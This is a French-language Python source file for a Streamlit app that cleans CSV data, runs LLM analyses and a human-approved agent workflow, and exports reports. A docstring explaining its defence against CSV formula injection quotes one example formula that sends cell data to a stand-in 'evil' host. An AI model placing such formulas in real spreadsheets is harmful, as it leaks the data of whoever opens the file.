# app.py — Application Streamlit de base
import csv
import io
import os
import re
import tempfile
import uuid
import zipfile
from datetime import datetime
import numpy as np
import pandas as pd
import streamlit as st
from dotenv import load_dotenv
from openpyxl import Workbook
from openpyxl.styles import Font
from openpyxl.utils.dataframe import dataframe_to_rows
from pptx import Presentation
from pptx.util import Inches, Pt
from pptx.dml.color import RGBColor
from litellm import completion

from agent.graph import build_agent_graph
from agent.state import AgentState

MAX_FILES = 5

# Modèles gratuits OpenRouter, essayés dans l'ordre si l'un est rate-limité
# (pool partagé entre tous les utilisateurs OpenRouter, donc peu fiable seul)
OPENROUTER_FREE_MODELS = [
    "openrouter/openai/gpt-oss-20b:free",
    "openrouter/nvidia/nemotron-3-super-120b-a12b:free",
    "openrouter/google/gemma-4-31b-it:free",
]

DATE_KEYWORDS = ["date", "time", "jour", "mois", "annee", "année", "year"]
DECIMAL_PATTERN = re.compile(r"^-?\d+,\d+$")
LEADING_ZERO_PATTERN = re.compile(r"^0\d")
FORMULA_PREFIX_CHARS = ("=", "+", "-", "@", "\t", "\r")


def neutralize_formulas(df: pd.DataFrame) -> pd.DataFrame:
    """Empêche l'injection de formule CSV/Excel (CWE-1236).

    Les fichiers CSV/XLSX exportés reproduisent tel quel le contenu du CSV
    téléversé (non fiable). Une cellule texte commençant par =, +, -, @, tab
    ou retour chariot est interprétée comme une formule par Excel/LibreOffice
    à l'ouverture — ex. `=HYPERLINK("http://evil/"&A1)` peut exfiltrer des
    données dès l'ouverture du fichier. On préfixe ces valeurs d'une apostrophe,
    convention standard qui force leur traitement en texte.
    """
    df = df.copy()
    for col in df.select_dtypes(include=["object", "str"]).columns:
        df[col] = df[col].map(
            lambda v: f"'{v}" if isinstance(v, str) and v.startswith(FORMULA_PREFIX_CHARS) else v
        )
    return df


def render_missing_values(missing_by_column: dict):
    """Affiche les valeurs manquantes par colonne en tableau plutôt qu'en dict brut."""
    st.warning("Valeurs manquantes restantes :")
    st.dataframe(
        pd.DataFrame(
            {"Colonne": col, "Valeurs manquantes": count}
            for col, count in missing_by_column.items()
        ),
        use_container_width=True,
        hide_index=True,
    )


def render_date_range(date_range_by_column: dict):
    """Affiche la plage de dates par colonne en tableau plutôt qu'en dict brut imbriqué."""
    st.caption("Plage de dates :")
    st.dataframe(
        pd.DataFrame(
            {"Colonne": col, "Min": r.get("min"), "Max": r.get("max")}
            for col, r in date_range_by_column.items()
        ),
        use_container_width=True,
        hide_index=True,
    )


def read_csv_robust(uploaded_file) -> tuple[pd.DataFrame, str]:
    """Lit un CSV en devinant l'encodage et le séparateur (utile pour les exports Excel FR).

    Le séparateur est deviné avec un jeu de délimiteurs restreint (évite que le
    détecteur automatique de pandas choisisse un caractère au hasard sur un
    fichier à une seule colonne) ; à défaut de détection fiable, on retombe sur
    la virgule.
    """
    last_err = None
    for enc in ["utf-8-sig", "utf-8", "latin-1"]:
        try:
            uploaded_file.seek(0)
            sample_bytes = uploaded_file.read(8192)
            sample_text = sample_bytes.decode(enc, errors="ignore")
            uploaded_file.seek(0)
            try:
                sep = csv.Sniffer().sniff(sample_text, delimiters=",;\t|").delimiter
            except csv.Error:
                sep = ","
            df = pd.read_csv(uploaded_file, sep=sep, encoding=enc)
            return df, enc
        except Exception as e:
            last_err = e
            continue
    raise last_err


def clean_data(df: pd.DataFrame) -> tuple[pd.DataFrame, dict]:
    """Nettoie un DataFrame : types, doublons, texte, dates, décimales FR."""
    df = df.copy()
    original_rows, original_cols = df.shape

    # Noms de colonnes propres
    df.columns = [str(c).strip() for c in df.columns]

    # Lignes/colonnes entièrement vides
    df = df.dropna(axis=0, how="all")
    df = df.dropna(axis=1, how="all")
    rows_after_empty_drop = df.shape[0]

    # Texte : strip + chaînes vides -> NaN
    obj_cols = df.select_dtypes(include=["object", "str"]).columns
    for col in obj_cols:
        df[col] = df[col].apply(lambda x: x.strip() if isinstance(x, str) else x)
        df[col] = df[col].replace({"": np.nan})

    # Nombres au format européen ("120,50" -> 120.50)
    converted_decimal = []
    for col in df.select_dtypes(include=["object", "str"]).columns:
        sample = df[col].dropna().astype(str)
        if len(sample) > 0 and sample.str.match(DECIMAL_PATTERN).mean() > 0.7:
            df[col] = df[col].astype(str).str.replace(",", ".", regex=False)
            converted_decimal.append(col)

    # Colonnes numériques stockées en texte (on protège les identifiants à
    # zéros non significatifs, ex. codes postaux "00501", pour ne pas les
    # convertir en nombres et perdre les zéros de tête)
    converted_numeric = []
    for col in df.select_dtypes(include=["object", "str"]).columns:
        sample = df[col].dropna().astype(str)
        if len(sample) > 0 and sample.str.match(LEADING_ZERO_PATTERN).mean() > 0.3:
            continue
        converted = pd.to_numeric(df[col], errors="coerce")
        non_null = df[col].notna().sum()
        if non_null > 0 and converted.notna().sum() / non_null > 0.9:
            df[col] = converted
            converted_numeric.append(col)

    # Colonnes de dates (formats mixtes ISO / JJ-MM / MM-JJ)
    converted_dates = []
    for col in df.select_dtypes(include=["object", "str"]).columns:
        if any(k in col.lower() for k in DATE_KEYWORDS):
            non_null = df[col].notna().sum()
            if non_null == 0:
                continue
            # ISO (AAAA-MM-JJ) est essayé en premier et isolément : avec
            # format="mixed", dayfirst=True inverse à tort jour/mois même sur
            # des dates ISO non ambiguës dès que le jour est <= 12 (bug pandas
            # observé). ISO8601 lève cette ambiguïté puisque l'année est
            # toujours le premier composant.
            parsed = pd.to_datetime(df[col], errors="coerce", format="ISO8601")
            remaining = parsed.isna() & df[col].notna()
            if remaining.any():
                # Le reste (formats JJ/MM/AAAA ou MM/JJ/AAAA) reste ambigu :
                # on garde l'heuristique par comparaison des deux lectures.
                parsed_eu = pd.to_datetime(df[col][remaining], errors="coerce", format="mixed", dayfirst=True)
                parsed_us = pd.to_datetime(df[col][remaining], errors="coerce", format="mixed", dayfirst=False)
                fallback = parsed_eu if parsed_eu.notna().sum() >= parsed_us.notna().sum() else parsed_us
                parsed.loc[remaining] = fallback
            if parsed.notna().sum() / non_null > 0.7:
                df[col] = parsed
                converted_dates.append(col)

    # Doublons exacts
    duplicates_removed = int(df.duplicated().sum())
    df = df.drop_duplicates().reset_index(drop=True)

    missing_after = df.isna().sum()
    missing_after = {k: int(v) for k, v in missing_after[missing_after > 0].items()}

    report = {
        "original_rows": original_rows,
        "original_cols": original_cols,
        "final_rows": df.shape[0],
        "final_cols": df.shape[1],
        "empty_rows_removed": original_rows - rows_after_empty_drop,
        "duplicates_removed": duplicates_removed,
        "columns_converted_decimal": converted_decimal,
        "columns_converted_numeric": converted_numeric,
        "columns_converted_date": converted_dates,
        "missing_values": missing_after,
    }
    return df, report


def sanitize_sheet_name(name: str, used: set) -> str:
    """Rend un nom de fichier compatible avec les contraintes de nom d'onglet Excel (31 car., uniques)."""
    base = re.sub(r"[:\\/?*\[\]]", "_", name.rsplit(".", 1)[0])[:31] or "Feuille"
    candidate = base
    i = 2
    while candidate in used:
        suffix = f"_{i}"
        candidate = base[: 31 - len(suffix)] + suffix
        i += 1
    used.add(candidate)
    return candidate


def build_markdown_report(query: str, model_used: str, files: list, analysis_text: str, timestamp: str) -> str:
    """Assemble un rapport Markdown autonome (question + données + analyse)."""
    files_desc = "\n".join(f"- {name} : {len(df)} lignes" for name, df in files)
    return "\n".join([
        f"# Rapport d'analyse — {timestamp}",
        "",
        f"**Question :** {query}",
        f"**Modèle utilisé :** {model_used}",
        "**Fichiers analysés (après nettoyage) :**",
        files_desc,
        "",
        "## Analyse",
        "",
        analysis_text,
    ])


def build_excel_report(files: list, query: str, model_used: str, analysis_text: str) -> bytes:
    """Génère un classeur Excel en mémoire : une feuille par fichier nettoyé + une feuille d'analyse."""
    wb = Workbook()
    wb.remove(wb.active)
    used_names = set()

    for name, df in files:
        ws = wb.create_sheet(sanitize_sheet_name(name, used_names))
        for row in dataframe_to_rows(neutralize_formulas(df), index=False, header=True):
            ws.append(row)
        for cell in ws[1]:
            cell.font = Font(bold=True)

    ws_analysis = wb.create_sheet("Analyse")
    ws_analysis.column_dimensions["A"].width = 100
    ws_analysis["A1"] = "Question"
    ws_analysis["A1"].font = Font(bold=True)
    ws_analysis["A2"] = query
    ws_analysis["A4"] = "Modèle"
    ws_analysis["A4"].font = Font(bold=True)
    ws_analysis["A5"] = model_used
    ws_analysis["A7"] = "Analyse"
    ws_analysis["A7"].font = Font(bold=True)
    for i, line in enumerate(analysis_text.split("\n")):
        ws_analysis.cell(row=8 + i, column=1, value=line)

    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def build_csv_export(files: list) -> tuple[bytes, str, str]:
    """Exporte les données nettoyées : un CSV seul, ou un ZIP si plusieurs fichiers."""
    if len(files) == 1:
        name, df = files[0]
        return neutralize_formulas(df).to_csv(index=False).encode("utf-8-sig"), "donnees_nettoyees.csv", "text/csv"

    buf = io.BytesIO()
    used_names = set()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, df in files:
            base = re.sub(r"\.csv$", "", name, flags=re.IGNORECASE)
            csv_name = f"{base}_nettoye.csv"
            i = 2
            while csv_name.lower() in used_names:
                csv_name = f"{base}_nettoye_{i}.csv"
                i += 1
            used_names.add(csv_name.lower())
            zf.writestr(csv_name, neutralize_formulas(df).to_csv(index=False))
    return buf.getvalue(), "donnees_nettoyees.zip", "application/zip"


def _chunk_text(text: str, max_chars: int = 700) -> list:
    """Découpe un texte en morceaux d'environ max_chars pour tenir sur des diapositives lisibles."""
    paragraphs = [p for p in text.split("\n") if p.strip()]
    chunks, current, current_len = [], [], 0
    for p in paragraphs:
        if current_len + len(p) > max_chars and current:
            chunks.append("\n".join(current))
            current, current_len = [], 0
        current.append(p)
        current_len += len(p)
    if current:
        chunks.append("\n".join(current))
    return chunks or [""]


def build_pptx_report(query: str, model_used: str, files: list, analysis_text: str, timestamp: str) -> bytes:
    """Génère une présentation PowerPoint générique : titre, fichiers analysés, puis l'analyse découpée en diapositives."""
    prs = Presentation()
    prs.slide_width = Inches(13.333)
    prs.slide_height = Inches(7.5)
    blank = prs.slide_layouts[6]

    slide = prs.slides.add_slide(blank)
    title_box = slide.shapes.add_textbox(Inches(1), Inches(2.3), Inches(11.3), Inches(1.5))
    tf = title_box.text_frame
    tf.word_wrap = True
    p = tf.paragraphs[0]
    p.text = "Rapport d'analyse"
    p.font.size = Pt(40)
    p.font.bold = True
    p.font.color.rgb = RGBColor(0x36, 0x25, 0x5C)

    sub_box = slide.shapes.add_textbox(Inches(1), Inches(4.0), Inches(11.3), Inches(2.5))
    tf2 = sub_box.text_frame
    tf2.word_wrap = True
    tf2.paragraphs[0].text = query
    tf2.paragraphs[0].font.size = Pt(20)
    p3 = tf2.add_paragraph()
    p3.text = f"{timestamp} — {model_used}"
    p3.font.size = Pt(14)

    slide2 = prs.slides.add_slide(blank)
    box = slide2.shapes.add_textbox(Inches(0.5), Inches(0.3), Inches(12), Inches(1))
    p = box.text_frame.paragraphs[0]
    p.text = "Fichiers analysés"
    p.font.size = Pt(32)
    p.font.bold = True
    box2 = slide2.shapes.add_textbox(Inches(0.5), Inches(1.5), Inches(12), Inches(5.5))
    tf2 = box2.text_frame
    tf2.word_wrap = True
    for i, (name, df) in enumerate(files):
        para = tf2.paragraphs[0] if i == 0 else tf2.add_paragraph()
        para.text = f"- {name} : {len(df)} lignes"
        para.font.size = Pt(18)

    chunks = _chunk_text(analysis_text)
    for i, chunk in enumerate(chunks):
        slide3 = prs.slides.add_slide(blank)
        title = "Analyse" if len(chunks) == 1 else f"Analyse ({i + 1}/{len(chunks)})"
        tbox = slide3.shapes.add_textbox(Inches(0.5), Inches(0.3), Inches(12), Inches(1))
        tp = tbox.text_frame.paragraphs[0]
        tp.text = title
        tp.font.size = Pt(28)
        tp.font.bold = True

        cbox = slide3.shapes.add_textbox(Inches(0.5), Inches(1.3), Inches(12), Inches(5.9))
        tf2 = cbox.text_frame
        tf2.word_wrap = True
        for j, line in enumerate(chunk.split("\n")):
            para = tf2.paragraphs[0] if j == 0 else tf2.add_paragraph()
            para.text = line
            para.font.size = Pt(14)

    buf = io.BytesIO()
    prs.save(buf)
    return buf.getvalue()


def render_agent_mode(cleaned_files: list, query: str, provider: str, current_source: tuple):
    """
    Pilote le workflow agent en 7 étapes (agent/graph.py) depuis l'UI, un
    onglet par fichier téléversé.

    Le graphe LangGraph attend un `data_path` unique : il n'y a pas
    d'analyse jointe entre fichiers, chacun a son propre cycle cadrage /
    inspection / approbation / résultats, complètement indépendant des
    autres (fil de checkpoint, base DuckDB et décision d'approbation
    propres à chaque fichier).

    Le graphe est compilé avec `interrupt_before=["approval"]` : il s'arrête
    réellement avant l'étape d'approbation (pas de input() bloquant). Cette
    fonction affiche le cadrage/l'inspection, recueille la décision humaine
    via deux boutons, puis reprend l'exécution avec `update_state` +
    `stream(None, ...)`.

    Chaque session Streamlit utilise ses propres fichiers DuckDB et de
    checkpoint pour ne pas interférer avec les autres utilisateurs.
    """
    session_dir = st.session_state.setdefault(
        "agent_session_dir", tempfile.mkdtemp(prefix="ai_data_agent_")
    )
    llm_provider = "groq" if "Groq" in provider else "openrouter"
    runs = st.session_state.setdefault("agent_runs", {})

    if st.session_state.get("agent_trigger_inspect"):
        st.session_state["agent_trigger_inspect"] = False
        for i, (name, df) in enumerate(cleaned_files):
            run_key = f"{i}_{name}"
            _start_agent_inspection(
                run_key, name, df, query, llm_provider, session_dir, current_source, runs
            )

    if len(cleaned_files) == 1:
        name, _ = cleaned_files[0]
        _render_single_agent_run(f"0_{name}", current_source, runs)
        return

    tabs = st.tabs([name for name, _ in cleaned_files])
    for i, (tab, (name, _)) in enumerate(zip(tabs, cleaned_files)):
        with tab:
            _render_single_agent_run(f"{i}_{name}", current_source, runs)


def _start_agent_inspection(
    run_key: str, name: str, df: pd.DataFrame, query: str, llm_provider: str,
    session_dir: str, current_source: tuple, runs: dict,
):
    """Lance le cadrage + l'inspection pour un fichier, jusqu'au point d'interruption."""
    safe_key = re.sub(r"[^\w.-]", "_", run_key)
    csv_path = os.path.join(session_dir, f"data_{safe_key}.csv")
    df.to_csv(csv_path, index=False)

    thread_id = str(uuid.uuid4())
    checkpoint_path = os.path.join(session_dir, f"checkpoint_{thread_id}.db")
    db_path = os.path.join(session_dir, f"analytics_{thread_id}.duckdb")

    try:
        with st.spinner(f"Cadrage et inspection en cours pour {name}..."):
            graph = build_agent_graph(checkpoint_path=checkpoint_path)
            initial_state = AgentState(
                query=query, data_path=csv_path, db_path=db_path, llm_provider=llm_provider,
            )
            config = {"configurable": {"thread_id": thread_id}}
            for _ in graph.stream(initial_state, config=config, stream_mode="values"):
                pass
            snapshot = graph.get_state(config)
    except Exception as e:
        runs[run_key] = {"source": current_source, "error": str(e)}
        return

    runs[run_key] = {
        "source": current_source,
        "thread_id": thread_id,
        "checkpoint_path": checkpoint_path,
        "awaiting_approval": snapshot.next == ("approval",),
        "snapshot_values": snapshot.values,
        "final_event": None,
    }


def _render_single_agent_run(run_key: str, current_source: tuple, runs: dict):
    """Affiche le cycle complet (cadrage/inspection/approbation/résultats) d'un fichier."""
    run = runs.get(run_key)
    if not run or run.get("source") != current_source:
        st.info('Clique sur "Lancer le cadrage et l\'inspection" pour démarrer.')
        return

    if run.get("error"):
        st.error(f"Le cadrage/l'inspection a échoué : {run['error']}")
        return

    values = run["snapshot_values"]

    st.subheader("Cadrage")
    st.write("**Question reformulée :**", values.get("business_question"))
    st.write("**Métrique :**", values.get("metric_definition") or "Non définie")
    st.write("**Période de comparaison :**", values.get("comparison_period") or "Non définie")
    if values.get("assumptions"):
        st.write("**Hypothèses :**", ", ".join(values["assumptions"]))

    meta = values.get("data_metadata") or {}
    st.subheader("Inspection des données")
    i1, i2, i3 = st.columns(3)
    i1.metric("Lignes", meta.get("row_count", "-"))
    i2.metric("Colonnes", len(meta.get("schema", [])))
    i3.metric("Doublons", meta.get("duplicate_count", "-"))
    st.write("**Colonne identifiant détectée :**", meta.get("id_column") or "Aucune")
    if meta.get("null_counts"):
        render_missing_values(meta["null_counts"])
    if meta.get("date_range"):
        render_date_range(meta["date_range"])

    if not run["awaiting_approval"]:
        st.error("L'inspection s'est terminée en erreur avant le point d'approbation.")
        return

    if run["final_event"] is None:
        st.markdown("---")
        st.subheader("Validation humaine requise")
        col_a, col_b = st.columns(2)
        approve = col_a.button(
            "Approuver", type="primary", use_container_width=True, key=f"agent_approve_{run_key}"
        )
        reject = col_b.button(
            "Rejeter", use_container_width=True, key=f"agent_reject_{run_key}"
        )

        if approve or reject:
            try:
                with st.spinner("Analyse en cours..."):
                    graph = build_agent_graph(checkpoint_path=run["checkpoint_path"])
                    config = {"configurable": {"thread_id": run["thread_id"]}}
                    graph.update_state(config, {"approval_received": approve})
                    final_event = {}
                    for event in graph.stream(None, config=config, stream_mode="values"):
                        final_event = event
            except Exception as e:
                st.error(
                    f"L'analyse a échoué (provider LLM temporairement indisponible ?) : {e}\n\n"
                    "Réessaie en cliquant à nouveau sur Approuver/Rejeter."
                )
                return
            run["final_event"] = final_event
            runs[run_key] = run
            st.rerun()
        return

    final = run["final_event"]
    if final.get("errors"):
        st.error(f"Analyse rejetée ou en erreur : {', '.join(final['errors'])}")
    else:
        st.success("Analyse terminée.")

        weekly = final.get("weekly_retention") or {}
        if weekly.get("data"):
            st.subheader(weekly.get("label", "Résultat"))
            st.markdown(weekly["data"])

        driver_analysis = final.get("driver_analysis") or []
        if driver_analysis:
            st.subheader("Facteurs explicatifs")
            for d in driver_analysis:
                with st.expander(d["dimension"]):
                    if "error" in d:
                        st.error(d["error"])
                    else:
                        st.markdown(d["result"])

        checks = final.get("validation_checks") or {}
        if checks:
            st.subheader("Validation")
            for check_name, check in checks.items():
                status = "OK" if check.get("passed") else "ÉCHEC"
                with st.expander(f"{check_name.replace('_', ' ').capitalize()} — {status}"):
                    st.markdown(str(check.get("result")))

        recommendations = final.get("recommendations") or []
        if recommendations:
            st.subheader("Recommandations")
            for i, rec in enumerate(recommendations, 1):
                with st.container(border=True):
                    st.markdown(f"**{i}. {rec.get('title', 'Sans titre')}**")
                    st.write(rec.get("description", ""))
                    m1, m2, m3 = st.columns(3)
                    m1.write(f"**Impact**\n\n{str(rec.get('impact', 'N/A')).capitalize()}")
                    m2.write(f"**Faisabilité**\n\n{str(rec.get('feasibility', 'N/A')).capitalize()}")
                    m3.write(f"**Délai**\n\n{str(rec.get('timeline', 'N/A')).capitalize()}")

        excel_path = final.get("excel_path")
        presentation_path = final.get("presentation_path")
        if excel_path or presentation_path:
            st.markdown("---")
            st.subheader("Livrables")
            d1, d2 = st.columns(2)
            if excel_path and os.path.exists(excel_path):
                with open(excel_path, "rb") as f:
                    d1.download_button(
                        "Télécharger le rapport Excel",
                        f.read(),
                        file_name=os.path.basename(excel_path),
                        mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                        use_container_width=True,
                        key=f"agent_dl_xlsx_{run_key}",
                    )
            if presentation_path and os.path.exists(presentation_path):
                with open(presentation_path, "rb") as f:
                    d2.download_button(
                        "Télécharger la présentation PowerPoint",
                        f.read(),
                        file_name=os.path.basename(presentation_path),
                        mime="application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        use_container_width=True,
                        key=f"agent_dl_pptx_{run_key}",
                    )

    if st.button("Nouvelle analyse (agent)", key=f"agent_reset_{run_key}"):
        del runs[run_key]
        st.rerun()


# Charger les variables d'environnement (local via .env, cloud via st.secrets)
load_dotenv()
try:
    for key, value in st.secrets.items():
        os.environ.setdefault(key, str(value))
except st.errors.StreamlitSecretNotFoundError:
    pass

# Configuration de la page
st.set_page_config(
    page_title="Agent IA d'Analyse de Données",
    layout="wide",
)

# Titre
st.title("Agent IA d'Analyse de Données")
st.markdown("---")

st.session_state.setdefault("history", [])

# Barre latérale (sidebar)
with st.sidebar:
    st.header("Configuration")
    analysis_mode = st.radio(
        "Mode d'analyse",
        ["Analyse simple (LLM en une passe)", "Agent complet (7 étapes, avec validation humaine)"],
    )
    provider = st.selectbox(
        "Provider LLM",
        ["Groq (Llama 3.3 70B)", "OpenRouter (GPT-OSS 20B, gratuit)"],
        index=0,
    )
    st.markdown("---")
    st.markdown("### À propos")
    st.markdown("Agent IA pour l'analyse de données avec génération de livrables.")

    st.markdown("---")
    st.markdown("### Historique (session en cours)")
    if not st.session_state["history"]:
        st.caption("Aucune analyse pour l'instant.")
    else:
        for entry in reversed(st.session_state["history"]):
            with st.expander(f"{entry['timestamp']} — {entry['query'][:40]}"):
                st.caption(f"Modèle : {entry['model_used']} · fichiers : {', '.join(entry['file_names'])}")
                st.markdown(entry["answer"])

# Zone principale — deux colonnes
col1, col2 = st.columns([1, 2])

with col1:
    st.header("1. Données")

    # Téléversement de fichiers (jusqu'à MAX_FILES)
    uploaded_files = st.file_uploader(
        f"Téléverser jusqu'à {MAX_FILES} fichiers CSV",
        type=["csv"],
        accept_multiple_files=True,
    )
    if uploaded_files and len(uploaded_files) > MAX_FILES:
        st.warning(f"Maximum {MAX_FILES} fichiers : seuls les {MAX_FILES} premiers seront utilisés.")
        uploaded_files = uploaded_files[:MAX_FILES]

    # Question de l'utilisateur
    query = st.text_area(
        "2. Question d'analyse",
        value="Identifie ce qui explique la récente baisse de rétention client",
        height=100,
    )

    # Bouton de lancement
    is_agent_mode = analysis_mode.startswith("Agent complet")
    button_label = "Lancer le cadrage et l'inspection" if is_agent_mode else "Lancer l'analyse"
    trigger_key = "agent_trigger_inspect" if is_agent_mode else "analyze"
    if st.button(button_label, type="primary", use_container_width=True):
        if not uploaded_files:
            st.warning("Veuillez téléverser au moins un fichier CSV.")
        else:
            st.session_state[trigger_key] = True

with col2:
    st.header("Résultats")

    if uploaded_files:
        # Charger, nettoyer et prétraiter chaque fichier — une erreur sur un
        # fichier (encodage/format invalide) ne doit pas faire échouer les autres.
        cleaned_files = []  # list of (name, df)
        # Liste positionnelle (pas un dict par nom : deux fichiers peuvent
        # porter le même nom, ce qui écraserait silencieusement l'entrée).
        describe_list = []
        tabs = st.tabs([f.name for f in uploaded_files])
        for tab, file in zip(tabs, uploaded_files):
            with tab:
                try:
                    raw_df, encoding_used = read_csv_robust(file)
                    df, cleaning_report = clean_data(raw_df)
                except Exception as e:
                    st.error(f"Impossible de lire ce fichier : {e}")
                    continue

                # os.path.basename en défense en profondeur : le nom de fichier
                # atterrit ensuite dans des noms d'onglet Excel / d'entrée ZIP,
                # on évite qu'un séparateur de chemin s'y retrouve.
                safe_name = os.path.basename(file.name)
                cleaned_files.append((safe_name, df))
                file_describe = df.describe()
                describe_list.append(file_describe)

                with st.expander("Rapport de nettoyage des données", expanded=False):
                    c1, c2, c3 = st.columns(3)
                    c1.metric("Lignes conservées", f"{cleaning_report['final_rows']} / {cleaning_report['original_rows']}")
                    c2.metric("Doublons supprimés", cleaning_report["duplicates_removed"])
                    c3.metric("Lignes vides supprimées", cleaning_report["empty_rows_removed"])

                    if encoding_used != "utf-8":
                        st.caption(f"Encodage détecté et corrigé : {encoding_used}")
                    if cleaning_report["columns_converted_decimal"]:
                        st.caption(f"Format décimal FR converti (',' → '.') : {', '.join(cleaning_report['columns_converted_decimal'])}")
                    if cleaning_report["columns_converted_numeric"]:
                        st.caption(f"Colonnes converties en nombres : {', '.join(cleaning_report['columns_converted_numeric'])}")
                    if cleaning_report["columns_converted_date"]:
                        st.caption(f"Colonnes converties en dates : {', '.join(cleaning_report['columns_converted_date'])}")
                    if cleaning_report["missing_values"]:
                        render_missing_values(cleaning_report["missing_values"])
                    else:
                        st.success("Aucune valeur manquante restante.")

                st.subheader(f"Aperçu des données nettoyées ({len(df)} lignes)")
                st.dataframe(df.head(10), use_container_width=True)

                st.subheader("Statistiques descriptives")
                st.dataframe(file_describe, use_container_width=True)

        # Le résultat affiché ne doit rester valide que pour les mêmes fichiers,
        # le même provider ET la même question — sinon un simple changement de
        # question sans reclic sur "Lancer l'analyse" afficherait une réponse
        # qui ne correspond plus à ce qui est tapé à l'écran.
        current_source = (tuple(sorted((f.name, f.size) for f in uploaded_files)), provider, query)

        if is_agent_mode:
            if not cleaned_files:
                st.error("Aucun fichier n'a pu être lu correctement, l'analyse ne peut pas être lancée.")
            else:
                render_agent_mode(cleaned_files, query, provider, current_source)

        # Si on a cliqué sur "Lancer l'analyse" (déclenchement à usage unique)
        elif st.session_state.get("analyze"):
            st.session_state["analyze"] = False
            if not cleaned_files:
                st.error("Aucun fichier n'a pu être lu correctement, l'analyse ne peut pas être lancée.")
            else:
                with st.spinner("Analyse en cours..."):
                    # Préparer le contexte pour le LLM : un résumé par fichier
                    summaries = []
                    for (name, df), desc in zip(cleaned_files, describe_list):
                        summaries.append(f"""
                        ### Fichier : {name}
                        - Nombre de lignes : {len(df)}
                        - Colonnes : {', '.join(df.columns.tolist())}
                        - Types de données : {df.dtypes.to_dict()}
                        - Statistiques : {desc.to_dict()}
                        - Premières lignes : {df.head(5).to_dict()}
                        """)
                    data_summary = "\n".join(summaries)

                    # Choisir la liste de modèles à essayer selon le provider
                    if "Groq" in provider:
                        candidates = ["groq/llama-3.3-70b-versatile"]
                        api_key = os.getenv("GROQ_API_KEY")
                    else:
                        candidates = OPENROUTER_FREE_MODELS
                        api_key = os.getenv("OPENROUTER_API_KEY")

                    prompt = f"""
                    Tu es un analyste de données IA expert.

                    Question : {query}

                    Voici les données ({len(cleaned_files)} fichier(s)) :
                    {data_summary}

                    Fournis une analyse structurée en français avec :
                    1. Cadrage (définition de la métrique, période)
                    2. Observations clés
                    3. Facteurs explicatifs possibles
                    4. Recommandations
                    """

                    if not api_key:
                        st.error(
                            "Clé API manquante pour ce provider. "
                            "Vérifie GROQ_API_KEY / OPENROUTER_API_KEY dans tes secrets."
                        )
                    else:
                        response = None
                        last_error = None
                        for model in candidates:
                            try:
                                response = completion(
                                    model=model,
                                    messages=[{"role": "user", "content": prompt}],
                                    api_key=api_key,
                                    temperature=0.3,
                                    max_tokens=2000,
                                )
                                break
                            except Exception as e:
                                # Volontairement large : le but de cette boucle est de
                                # basculer sur le modèle gratuit suivant quelle que soit
                                # la cause de l'échec (auth, contexte trop long, réseau...).
                                last_error = e
                                continue

                        if response is not None:
                            analysis_text = response.choices[0].message.content
                            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")

                            st.session_state["last_result"] = {
                                "timestamp": timestamp,
                                "query": query,
                                "model_used": model,
                                "file_names": [name for name, _ in cleaned_files],
                                "answer": analysis_text,
                                "source": current_source,
                            }
                            st.session_state["history"].append(st.session_state["last_result"])
                            st.session_state["history"] = st.session_state["history"][-20:]
                        else:
                            st.session_state["last_result"] = None
                            st.error(
                                f"Tous les modèles gratuits sont temporairement indisponibles "
                                f"({provider}). Réessaie dans quelques instants. Détail : {last_error}"
                            )

        # Affichage du dernier résultat — indépendant du déclencheur ci-dessus,
        # pour que les boutons de téléchargement (qui provoquent un rerun) ne le fassent pas disparaître
        last_result = st.session_state.get("last_result")
        if not is_agent_mode and last_result and last_result.get("source") == current_source:
            st.subheader("Analyse de l'IA")
            st.markdown(last_result["answer"])

            st.markdown("---")
            st.subheader("Exporter")
            csv_data, csv_name, csv_mime = build_csv_export(cleaned_files)
            dl1, dl2, dl3, dl4 = st.columns(4)
            dl1.download_button(
                "Rapport (Markdown)",
                data=build_markdown_report(
                    last_result["query"], last_result["model_used"], cleaned_files,
                    last_result["answer"], last_result["timestamp"],
                ),
                file_name="rapport_analyse.md",
                mime="text/markdown",
                use_container_width=True,
            )
            dl2.download_button(
                "Données nettoyées",
                data=csv_data,
                file_name=csv_name,
                mime=csv_mime,
                use_container_width=True,
            )
            dl3.download_button(
                "Rapport complet (Excel)",
                data=build_excel_report(cleaned_files, last_result["query"], last_result["model_used"], last_result["answer"]),
                file_name="rapport_analyse.xlsx",
                mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                use_container_width=True,
            )
            dl4.download_button(
                "Présentation (PowerPoint)",
                data=build_pptx_report(
                    last_result["query"], last_result["model_used"], cleaned_files,
                    last_result["answer"], last_result["timestamp"],
                ),
                file_name="rapport_analyse.pptx",
                mime="application/vnd.openxmlformats-officedocument.presentationml.presentation",
                use_container_width=True,
            )
